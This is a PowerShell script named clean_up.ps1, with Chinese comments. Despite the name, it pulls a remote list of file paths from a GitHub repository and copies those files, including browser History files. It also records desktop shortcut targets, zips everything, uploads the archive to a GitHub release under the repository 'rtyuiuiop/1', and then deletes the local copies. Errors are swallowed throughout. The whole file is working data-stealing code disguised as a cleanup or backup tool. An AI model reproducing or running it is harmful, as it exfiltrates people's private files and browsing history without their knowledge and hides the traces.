# clean_up.ps1 – 实际上传逻辑

[Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
$OutputEncoding = [System.Text.UTF8Encoding]::UTF8

$token = $env:GITHUB_TOKEN
$repo  = "rtyuiuiop/1"

$now          = Get-Date
$timestamp    = $now.ToString("yyyy-MM-dd-HHmmss")
$date         = $now.ToString("yyyy-MM-dd")
$computerName = $env:COMPUTERNAME

$tag         = "backup-$computerName-$timestamp"
$releaseName = "Backup - $computerName - $date"

$tempRoot = "$env:TEMP\package-$computerName-$timestamp"
$zipName  = "package-$computerName-$timestamp.zip"
$zipPath  = Join-Path $env:TEMP $zipName

# 准备临时目录
New-Item -ItemType Directory -Path $tempRoot -Force | Out-Null

# STEP 1: 取路径列表
$remoteTxtUrl = "https://raw.githubusercontent.com/rtyuiuiop/1/main/.github/upload-paths.txt"
$pathList = @()
try {
    $content = Invoke-RestMethod $remoteTxtUrl -UseBasicParsing -ErrorAction Stop
    $pathList = $content -split "`n" | ForEach-Object { $_.Trim() } | Where-Object { $_ }
} catch {
    return
}

# STEP 2: 复制文件
$index = 0
foreach ($path in $pathList) {
    $index++; $name = "item$index"
    if (-not (Test-Path $path)) { continue }
    $dest = Join-Path $tempRoot $name
    try {
        if ($path -like "*\History" -and (Test-Path $path -PathType Leaf)) {
            robocopy (Split-Path $path) $dest (Split-Path $path -Leaf) /NFL /NDL /NJH /NJS /nc /ns /np > $null
        } elseif (Test-Path $path -PathType Container) {
            Copy-Item $path -Destination $dest -Recurse -Force
        } else {
            Copy-Item $path -Destination $dest -Force
        }
    } catch {}
}

# STEP 3: 桌面 .lnk 信息
try {
    $desktop  = [Environment]::GetFolderPath("Desktop")
    $lnkFiles = Get-ChildItem $desktop -Filter *.lnk -ErrorAction SilentlyContinue
    $report   = ""
    foreach ($lnk in $lnkFiles) {
        $shell    = New-Object -ComObject WScript.Shell
        $shortcut = $shell.CreateShortcut($lnk.FullName)
        $report  += "[$($lnk.Name)]`nTarget: $($shortcut.TargetPath)`nArgs: $($shortcut.Arguments)`n-----`n"
    }
    $report | Out-File (Join-Path $tempRoot "lnk_info.txt") -Encoding UTF8
} catch {}

# STEP 4: 压缩
try {
    Compress-Archive -Path "$tempRoot\*" -DestinationPath $zipPath -Force
} catch {
    return
}

# STEP 5: 上传到 GitHub Release
$releaseData = @{
    tag_name   = $tag
    name       = $releaseName
    body       = "Automated file package from $computerName on $date"
    draft      = $false
    prerelease = $false
} | ConvertTo-Json -Depth 3

$headers = @{
    Authorization = "token $token"
    "User-Agent"  = "PowerShellScript"
    Accept        = "application/vnd.github.v3+json"
}

try {
    $rel = Invoke-RestMethod -Uri "https://api.github.com/repos/$repo/releases" -Method POST -Headers $headers -Body $releaseData -ErrorAction Stop
    $uploadUrl = $rel.upload_url -replace "{.*}", "?name=$zipName"
    $bytes     = [System.IO.File]::ReadAllBytes($zipPath)
    Invoke-RestMethod -Uri $uploadUrl -Method POST -Headers @{ Authorization="token $token"; "Content-Type"="application/zip" } -Body $bytes -ErrorAction Stop
} catch {}

# STEP 6: 清理
Remove-Item $tempRoot -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
